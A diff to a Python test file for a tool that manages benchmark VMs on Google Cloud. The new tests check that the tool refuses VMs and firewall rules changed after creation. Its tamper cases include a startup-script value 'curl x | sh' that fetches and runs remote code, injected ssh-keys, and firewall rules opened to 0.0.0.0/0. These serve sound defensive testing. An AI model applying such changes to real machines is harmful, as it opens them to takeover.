@@ -98,8 +98,17 @@ NUMBER = "357378285144"
 
 
 def _record(run: str = RUN, zone: str = ZONE, **kv) -> None:
-    """The laptop record `up --yes` writes (the run's VM, project, zone): a test that starts after up."""
+    """The laptop record `up --yes` writes (the run's VM, project, zone, TTL): a test that starts after up."""
+    kv.setdefault("ttl_hours", 15)
     vm606._save_state(run, vm=vm606.vm_name(run), project=PROJECT, zone=zone, project_number=NUMBER, **kv)
+
+
+def _vm(fake, labels=None, hours: float = 15.0, zone: str = ZONE) -> Path:
+    """The run's VM as up makes it, and the record up writes for it (its zone, TTL, termination time)."""
+    tt = _in(hours)
+    srv = fake_vm606.put_instance(fake, VM, LABELS if labels is None else labels, tt, zone=zone)
+    _record(zone=zone, terminates_at=tt)
+    return srv
 
 
 def _changing(st) -> list[str]:
@@ -317,7 +326,7 @@ sys.addaudithook(_audit)
 
 
 def _ready(fake) -> Path:
-    srv = fake_vm606.put_instance(fake, VM, LABELS, _in(15), zone=ZONE)
+    srv = _vm(fake)
     fake_vm606.bootstrap_done(fake, VM, BOOT)
     _record(bootstrap=BOOT)
     return srv
@@ -367,7 +376,7 @@ def test_push_secret_refuses_a_token_file_not_0600(fake, capsys):
 
 
 def test_push_secret_refuses_a_vm_it_did_not_make(fake, capsys):
-    fake_vm606.put_instance(fake, VM, {"owner": "someone-else", "run": RUN}, _in(15), zone=ZONE)
+    _vm(fake, {"owner": "someone-else", "run": RUN})
     _record(bootstrap=BOOT)
     _token()
     rc, _out, err = _run(capsys, "push-secret", "--run", RUN, "--yes")
@@ -468,7 +477,7 @@ def _launch_args(tmp_path, repo, sha, pin, pin_sha, env_file=None, bench_zone="e
 
 def _vm_ready(fake, hours=15.0) -> Path:
     """After up and push-secret: the run's directory with the token in it and its venv. Returns it."""
-    srv = fake_vm606.put_instance(fake, VM, LABELS, _in(hours), zone=ZONE)
+    srv = _vm(fake, hours=hours)
     fake_vm606.bootstrap_done(fake, VM, BOOT)
     _record(bootstrap=BOOT)
     r = srv / RUN
@@ -666,8 +675,7 @@ def test_a_remote_script_survives_a_child_that_reads_stdin(tmp_path):
 # ─── status ─────────────────────────────────────────────────────────────────
 
 def test_status_tails_the_log_redacted_and_says_the_vms_time_left(fake, capsys):
-    srv = fake_vm606.put_instance(fake, VM, LABELS, _in(10), zone=ZONE)
-    _record()
+    srv = _vm(fake, hours=10)
     r = srv / RUN
     r.mkdir()
     (r / "launch.log").write_text("".join(f"[06:5{i}:00] line {i}\n" for i in range(5))
@@ -687,7 +695,7 @@ NAMES = [ENV["RUN_NAME_N1"], ENV["RUN_NAME_N2"]]
 
 def _vm_after_run(fake, monkeypatch, *, alive=False) -> Path:
     """The VM after a launch: each run's directory and its evidence (published by bench.evidence)."""
-    srv = fake_vm606.put_instance(fake, VM, LABELS, _in(3), zone=ZONE)
+    srv = _vm(fake, hours=3)
     r = srv / RUN
     sha = "c" * 40
     b = r / "snowplow" / "go" / "snowplow" / "e2e" / "bench" / "bench"
@@ -816,8 +824,7 @@ def test_down_dry_deletes_nothing(fake, capsys, monkeypatch):
 @pytest.mark.parametrize("labels", [{"owner": "someone-else", "run": RUN}, {"owner": "snowplow-bench", "run": "run9"},
                                     {"run": RUN}])
 def test_down_refuses_an_instance_not_labelled_for_the_run(fake, capsys, labels):
-    fake_vm606.put_instance(fake, VM, labels, _in(3), zone=ZONE)
-    _record()
+    _vm(fake, labels, 3)
     rc, _out, err = _run(capsys, "down", "--run", RUN, "--yes")
     assert rc == 2 and "is not labelled owner=snowplow-bench, run=run25" in err
     assert "compute instances delete" not in _verbs(fake)
@@ -828,7 +835,7 @@ def test_down_refuses_a_firewall_rule_it_did_not_make_and_deletes_nothing(fake, 
     p = fake / "firewalls" / f"{VM}-iap-ssh.json"
     p.write_text(json.dumps({**json.loads(p.read_text()), "description": "someone else's"}))
     rc, _out, err = _run(capsys, "down", "--run", RUN, "--yes")
-    assert rc == 2 and f"firewall rule '{VM}-iap-ssh' is not one vm606 made" in err
+    assert rc == 2 and f"firewall rule '{VM}-iap-ssh' is not as vm606 made it" in err and "description" in err
     assert not [v for v in _verbs(fake) if v.endswith(" delete") or "remove-iam" in v]
 
 
@@ -843,9 +850,8 @@ def test_down_refuses_a_binding_with_its_title_but_not_its_form(fake, capsys, mo
 
 
 def test_down_refuses_when_the_label_selects_another_vm(fake, capsys):
-    fake_vm606.put_instance(fake, VM, LABELS, _in(3), zone=ZONE)
+    _vm(fake, hours=3)
     fake_vm606.put_instance(fake, "snowplow-bench-orch-other", LABELS, _in(3), zone=ZONE)
-    _record()
     rc, _out, err = _run(capsys, "down", "--run", RUN, "--yes")
     assert rc == 2 and f"besides {VM} ({ZONE}), snowplow-bench-orch-other ({ZONE}) claim(s) run {RUN}" in err
     assert _changing(fake) == []
@@ -853,8 +859,7 @@ def test_down_refuses_when_the_label_selects_another_vm(fake, capsys):
 
 def test_down_fails_closed_when_a_list_fails_open(fake, capsys, monkeypatch):
     """gcloud's list exits 0 with [] when its requests fail; vm606 sets the property that makes it exit 1."""
-    fake_vm606.put_instance(fake, VM, LABELS, _in(3), zone=ZONE)
-    _record()
+    _vm(fake, hours=3)
     monkeypatch.setenv("FAKE_LIST_FAILS", "1")
     rc, _out, err = _run(capsys, "down", "--run", RUN, "--yes")
     assert rc == 2 and "could not be listed (rc=1" in err
@@ -862,15 +867,14 @@ def test_down_fails_closed_when_a_list_fails_open(fake, capsys, monkeypatch):
 
 
 def test_down_refuses_a_disk_left_behind(fake, capsys, monkeypatch):
-    fake_vm606.put_instance(fake, VM, LABELS, _in(3), zone=ZONE)
-    _record()
+    _vm(fake, hours=3)
     monkeypatch.setenv("FAKE_KEEP_DISKS", "1")
     rc, _out, err = _run(capsys, "down", "--run", RUN, "--yes")
     assert rc == 2 and f"disk(s) ['{VM}'] remain" in err and "the pull-token file is on one of them" in err
 
 
 def test_down_refuses_an_unfetched_launch_and_a_running_launcher(fake, capsys, monkeypatch):
-    srv = fake_vm606.put_instance(fake, VM, LABELS, _in(3), zone=ZONE)
+    srv = _vm(fake, hours=3)
     _record(launched_at=time.time(), fetched=False)
     rc, _out, err = _run(capsys, "down", "--run", RUN, "--yes")
     assert rc == 2 and "was launched and not fetched" in err
@@ -1001,9 +1005,7 @@ def _in_use(fake, how):
         fake_vm606.put_instance(fake, "snowplow-bench-orch-x", LABELS, _in(3), zone="europe-west1-b")
     elif how == "rule":
         fake_vm606.put_policy(fake, f"project-{PROJECT}", [])
-        (fake / "firewalls").mkdir(parents=True, exist_ok=True)
-        (fake / "firewalls" / f"{VM}-iap-ssh.json").write_text(json.dumps({
-            "name": f"{VM}-iap-ssh", **vm606.firewall_rules(RUN)[f"{VM}-iap-ssh"]}))
+        fake_vm606.put_rule(fake, RUN, f"{VM}-iap-ssh")
     elif how == "binding":
         fake_vm606.put_policy(fake, f"sa-{NODE_SA}", [{"role": "roles/iam.serviceAccountUser", "members": [SA],
                                                      "condition": vm606.iam_condition(RUN, "2026-11-11T00:00:00Z")}])
@@ -1354,7 +1356,7 @@ def test_the_iap_code_decides_before_ssh_s_own_closed_connection():
 @pytest.mark.parametrize("boot", [None, {**BOOT, "kubectl": "v1.35.0"}])
 def test_push_secret_and_launch_refuse_a_run_whose_bootstrap_was_not_verified(fake, capsys, tmp_path, cmd, boot):
     """A run whose up stopped early (its record holds no verified bootstrap) is never pushed to or launched on."""
-    fake_vm606.put_instance(fake, VM, LABELS, _in(15), zone=ZONE)
+    _vm(fake)
     fake_vm606.bootstrap_done(fake, VM, BOOT)                  # the VM's marker alone is not the record's
     _record(**({"bootstrap": boot} if boot else {}))
     _token()
@@ -1417,7 +1419,67 @@ def test_up_resume_refuses_a_flag_that_is_not_the_records(fake, capsys, monkeypa
     assert fake_vm606.calls(fake)[n:] == []
 
 
+def _patch(path: Path, fn) -> None:
+    d = json.loads(path.read_text())
+    fn(d)
+    path.write_text(json.dumps(d))
+
+
+def _set_item(key, value):
+    def fn(d):
+        items = [i for i in d["metadata"]["items"] if i["key"] != key]
+        d["metadata"]["items"] = items + ([{"key": key, "value": value}] if value is not None else [])
+    return fn
+
+
+OTHER_NET = f"https://www.googleapis.com/compute/v1/projects/{PROJECT}/global/networks/other"
+# #1331 review: each field carries an owner ruling (IAP-only SSH, expiring access, OS Login) or is one up sets
+TAMPER = [
+    ("deny-disabled", f"firewall rule {VM}-deny-ssh disabled: true, up made false",
+     ("rule", f"{VM}-deny-ssh", lambda d: d.update(disabled=True))),
+    ("iap-disabled", f"firewall rule {VM}-iap-ssh disabled: true, up made false",
+     ("rule", f"{VM}-iap-ssh", lambda d: d.update(disabled=True))),
+    ("rule-network", f'firewall rule {VM}-deny-ssh network: "{OTHER_NET}"',
+     ("rule", f"{VM}-deny-ssh", lambda d: d.update(network=OTHER_NET))),
+    ("rule-target-sa", f'firewall rule {VM}-iap-ssh targetServiceAccounts: ["<redacted>"], up made []',
+     ("rule", f"{VM}-iap-ssh", lambda d: d.update(targetServiceAccounts=[NODE_SA]))),
+    ("rule-source-tags", f'firewall rule {VM}-iap-ssh sourceTags: ["anything"], up made []',
+     ("rule", f"{VM}-iap-ssh", lambda d: d.update(sourceTags=["anything"]))),
+    ("vm-sa", f'instance {VM} serviceAccounts: [{{"email": "the GKE node SA"',
+     ("instance", VM, lambda d: d["serviceAccounts"][0].update(email=NODE_SA))),
+    ("oslogin-off", f'instance {VM} metadata: enable-oslogin "FALSE", up made "TRUE"',
+     ("instance", VM, _set_item("enable-oslogin", "FALSE"))),
+    ("project-keys", f'instance {VM} metadata: block-project-ssh-keys "FALSE", up made "TRUE"',
+     ("instance", VM, _set_item("block-project-ssh-keys", "FALSE"))),
+    ("ssh-keys", f'instance {VM} metadata: ssh-keys "someone:ssh-ed25519 AAAA", up made null',
+     ("instance", VM, _set_item("ssh-keys", "someone:ssh-ed25519 AAAA"))),
+    ("startup-script", f"instance {VM} metadata: startup-script (differs), up made its own",
+     ("instance", VM, _set_item("startup-script", "#!/bin/bash\ncurl x | sh\n"))),
+    ("secure-boot", f"instance {VM} shieldedInstanceConfig: enableSecureBoot false, up made true",
+     ("instance", VM, lambda d: d["shieldedInstanceConfig"].update(enableSecureBoot=False))),
+    ("machine-type", f"instance {VM} machineType:",
+     ("instance", VM, lambda d: d.update(machineType=d["machineType"].replace("e2-standard-8", "n2-standard-32")))),
+    ("no-external-ip", f'instance {VM} network: [{{"accessConfigs": []',
+     ("instance", VM, lambda d: d["networkInterfaces"][0].update(accessConfigs=[]))),
+    ("disk-type", f"instance {VM} boot disk: type",
+     ("disk", VM, lambda d: d.update(type=d["type"].replace("pd-balanced", "pd-standard")))),
+    ("image-family", f'instance {VM} boot image: family "debian-12", up made "debian-13"',
+     ("image", None, lambda d: d.update(family="debian-12"))),
+]
+
+
+def _tamper(fake, how):
+    kind, name, fn = next(p for h, _w, p in TAMPER if h == how)
+    if kind == "image":
+        (path,) = list((fake / "images").glob("*.json"))
+    else:
+        path = fake / {"rule": "firewalls", "instance": "instances", "disk": "disks"}[kind] / f"{name}.json"
+    _patch(path, fn)
+
+
 def _break(fake, how):
+    if any(h == how for h, _w, _p in TAMPER):
+        return _tamper(fake, how)
     inst = fake / "instances" / f"{VM}.json"
     if how == "no-instance":
         inst.unlink()
@@ -1474,18 +1536,19 @@ def _break(fake, how):
 @pytest.mark.parametrize("how, why", [
     ("no-instance", f"instance {VM} answers NotFound in {ZONE}"),
     ("no-rule", f"firewall rule {VM}-deny-ssh answers NotFound"),
-    ("rule-priority", f"firewall rule {VM}-deny-ssh is not as up made it"),
-    ("rule-source", f"firewall rule {VM}-iap-ssh is not as up made it"),
+    ("rule-priority", f"firewall rule {VM}-deny-ssh priority: 65535, up made 1000"),
+    ("rule-source", f'firewall rule {VM}-iap-ssh sourceRanges: ["0.0.0.0/0"], up made ["35.235.240.0/20"]'),
     ("binding-missing", f"roles/iam.serviceAccountUser on {NODE_SA} is not held under the condition"),
     ("binding-extra", "roles/owner on operations-dev-krateo-io is held under snowplow-bench-run25"),
     ("binding-other-expiry", "which up does not grant"),
     ("unconditional", "holds roles/compute.viewer on operations-dev-krateo-io unconditionally"),
-    ("termination", f"{VM} does not delete itself at the record's"),
-    ("tags", f"{VM}'s network tags are []"),
+    ("termination", f'instance {VM} terminationTime: "2027-01-01T00:00:00Z", up made'),
+    ("tags", f'instance {VM} tags: [], up made ["{VM}"]'),
     ("label", "is not labelled owner=snowplow-bench, run=run25"),
     ("namesake", f"{VM} (europe-west1-b) claim(s) run {RUN} too"),
-    ("ttl-label", f"{VM}'s ttl-hours label is not the record's 15"),
-    ("termination-action", f"{VM} does not delete itself at the record's"),
+    ("ttl-label", f'instance {VM} labels: ttl-hours "72", up made "15"'),
+    ("termination-action", f'instance {VM} instanceTerminationAction: "STOP", up made "DELETE"'),
+    *[(how, why) for how, why, _p in TAMPER],
 ])
 def test_up_resume_refuses_anything_partial_or_not_as_made_and_changes_nothing(fake, capsys, monkeypatch, how, why):
     _stopped_in_bootstrap(fake, capsys, monkeypatch)
@@ -1530,3 +1593,105 @@ def test_up_resume_confirms_the_parents_first(fake, capsys, monkeypatch):
     rc, _out, err = _run(capsys, "up", "--run", RUN, "--yes", "--poll-s", "0")
     assert rc == 2 and f"project {PROJECT} is DELETE_REQUESTED, not ACTIVE" in err
     assert [" ".join(c["argv"][:2]) for c in fake_vm606.calls(fake)[n:]] == ["projects describe"]
+
+
+
+@pytest.mark.parametrize("how, why", [(h, w) for h, w, _p in TAMPER])
+def test_down_refuses_a_resource_not_as_up_made_it_and_changes_nothing(fake, capsys, monkeypatch, how, why):
+    """down's ownership check is the same read-back: a rule or a VM changed after up is not deleted on trust."""
+    _upped(fake, capsys, monkeypatch)
+    _tamper(fake, how)
+    before = _snapshot(fake)
+    n = len(fake_vm606.calls(fake))
+    rc, out, err = _run(capsys, "down", "--run", RUN, "--yes")
+    assert rc == 2 and why in err and "nothing was changed" in err, err
+    assert _snapshot(fake) == before and _no_writes_since(fake, n) == []
+
+
+@pytest.mark.parametrize("cmd", ["push-secret", "status"])
+@pytest.mark.parametrize("how", ["vm-sa", "oslogin-off"])
+def test_a_step_on_the_vm_refuses_a_vm_not_as_up_made_it(fake, capsys, cmd, how):
+    _ready(fake)
+    _tamper(fake, how)
+    _token()
+    rc, _out, err = _run(capsys, cmd, "--run", RUN, *(["--yes"] if cmd == "push-secret" else []))
+    assert rc == 2 and f"{VM} is not as up made it" in err
+    assert not [c for c in fake_vm606.calls(fake) if c["argv"][1] in ("ssh", "scp")]
+
+
+def test_up_reads_each_rule_back_right_after_creating_it(fake, capsys, monkeypatch):
+    monkeypatch.setenv("FAKE_FW_ON_CREATE", json.dumps({"disabled": True}))
+    rc, _out, err = _up(capsys, monkeypatch)
+    assert rc == 2 and f"firewall rule {VM}-deny-ssh disabled: true, up made false" in err
+    assert "compute instances create" not in _verbs(fake)                  # before the VM exists
+
+
+def test_up_reads_the_vm_back_right_after_creating_it(fake, capsys, monkeypatch):
+    monkeypatch.setenv("FAKE_INSTANCE_ON_CREATE", json.dumps({"serviceAccounts": [{
+        "email": NODE_SA, "scopes": ["https://www.googleapis.com/auth/cloud-platform"]}]}))
+    rc, _out, err = _up(capsys, monkeypatch)
+    assert rc == 2 and f'instance {VM} serviceAccounts: [{{"email": "the GKE node SA"' in err
+    assert f"down --run {RUN} --yes" in err
+    assert not [c for c in fake_vm606.calls(fake) if c["argv"][:2] == ["compute", "ssh"]]   # never waited on
+
+
+def _flags(argv: list[str]) -> set[str]:
+    return {x for x in argv if x.startswith("--")}
+
+
+def test_the_read_back_covers_every_flag_of_the_create_commands():
+    """Each flag up's create commands pass is a field the read-back compares (FIREWALL_FIELDS /
+    INSTANCE_FIELDS), and each field compared has a value up made."""
+    fw, rule = next(iter(vm606.firewall_rules(RUN).items()))
+    assert _flags(vm606.firewall_create_argv(fw, rule, PROJECT)) == \
+        {f for fl in vm606.FIREWALL_FIELDS.values() for f in fl if f.startswith("--")}
+    assert _flags(vm606.create_command(RUN, PROJECT, ZONE, 15, "startup.sh", _in(15))) == \
+        {f for fl in vm606.INSTANCE_FIELDS.values() for f in fl if f.startswith("--")}
+    assert set(vm606.firewall_want(fw, rule, PROJECT)) == set(vm606.FIREWALL_FIELDS)
+    st = {"project": PROJECT, "zone": ZONE, "ttl_hours": 15, "terminates_at": _in(15)}
+    assert set(vm606.instance_want(RUN, st)) == set(vm606.INSTANCE_FIELDS)
+
+
+# the keys gcloud 561's describe answered, read live and read-only on 2026-11-11 (the PR body has the calls):
+# default-allow-ssh, an instance of the project, and its boot disk
+REAL_FIREWALL_KEYS = {"allowed", "creationTimestamp", "description", "direction", "disabled", "id", "kind", "logConfig",
+                      "name", "network", "priority", "selfLink", "sourceRanges"}
+REAL_INSTANCE_KEYS = {"cpuPlatform", "creationTimestamp", "deletionProtection", "disks", "fingerprint", "id", "kind",
+                      "labelFingerprint", "labels", "lastStartTimestamp", "machineType", "metadata", "name",
+                      "networkInterfaces", "networkPerformanceConfig", "resourceStatus", "satisfiesPzi", "scheduling",
+                      "selfLink", "serviceAccounts", "shieldedInstanceConfig", "shieldedInstanceIntegrityPolicy",
+                      "startRestricted", "status", "tags", "zone"}
+REAL_NIC_KEYS = {"accessConfigs", "aliasIpRanges", "fingerprint", "kind", "name", "network", "networkIP", "stackType",
+                 "subnetwork"}
+REAL_DISK_KEYS = {"architecture", "creationTimestamp", "enableConfidentialCompute", "guestOsFeatures", "id", "kind",
+                  "labelFingerprint", "labels", "lastAttachTimestamp", "licenseCodes", "licenses", "name",
+                  "physicalBlockSizeBytes", "satisfiesPzi", "selfLink", "sizeGb", "sourceImage", "sourceImageId",
+                  "status", "type", "users", "zone"}
+# what the read-back reads of each; the fake answers these in GCE's shapes
+READ_FIREWALL = {"name", "network", "direction", "priority", "sourceRanges", "allowed", "description", "disabled"}
+READ_INSTANCE = {"name", "zone", "machineType", "disks", "serviceAccounts", "networkInterfaces", "tags", "labels",
+                 "metadata", "scheduling", "shieldedInstanceConfig"}
+
+
+def test_the_fakes_describe_answers_in_gces_shapes(fake, capsys, monkeypatch):
+    _up(capsys, monkeypatch)
+    fw = json.loads((fake / "firewalls" / f"{VM}-iap-ssh.json").read_text())
+    inst = json.loads((fake / "instances" / f"{VM}.json").read_text())
+    disk = json.loads((fake / "disks" / f"{VM}.json").read_text())
+    assert READ_FIREWALL <= REAL_FIREWALL_KEYS and READ_FIREWALL <= set(fw)
+    assert READ_INSTANCE <= REAL_INSTANCE_KEYS and READ_INSTANCE <= set(inst)
+    assert {"sizeGb", "type", "sourceImage"} <= REAL_DISK_KEYS and {"sizeGb", "type", "sourceImage"} <= set(disk)
+    api = f"https://www.googleapis.com/compute/v1/projects/{PROJECT}"
+    assert fw["network"] == f"{api}/global/networks/default" and fw["disabled"] is False
+    assert fw["allowed"] == [{"IPProtocol": "tcp", "ports": ["22"]}]
+    assert inst["zone"] == f"{api}/zones/{ZONE}" and inst["machineType"] == f"{api}/zones/{ZONE}/machineTypes/e2-standard-8"
+    assert set(inst["networkInterfaces"][0]) <= REAL_NIC_KEYS
+    assert inst["networkInterfaces"][0]["network"] == f"{api}/global/networks/default"
+    assert inst["networkInterfaces"][0]["accessConfigs"][0]["type"] == "ONE_TO_ONE_NAT"
+    assert inst["serviceAccounts"] == [{"email": f"snowplow-bench-orchestrator@{PROJECT}.iam.gserviceaccount.com",
+                                        "scopes": ["https://www.googleapis.com/auth/cloud-platform"]}]
+    assert {tuple(sorted(i)) for i in inst["metadata"]["items"]} == {("key", "value")}
+    assert set(inst["metadata"]) == {"fingerprint", "items", "kind"} and set(inst["tags"]) == {"fingerprint", "items"}
+    assert set(inst["shieldedInstanceConfig"]) == {"enableIntegrityMonitoring", "enableSecureBoot", "enableVtpm"}
+    assert disk["sizeGb"] == "50" and disk["type"] == f"{api}/zones/{ZONE}/diskTypes/pd-balanced"
+    assert disk["sourceImage"].startswith("https://www.googleapis.com/compute/v1/projects/debian-cloud/global/images/")
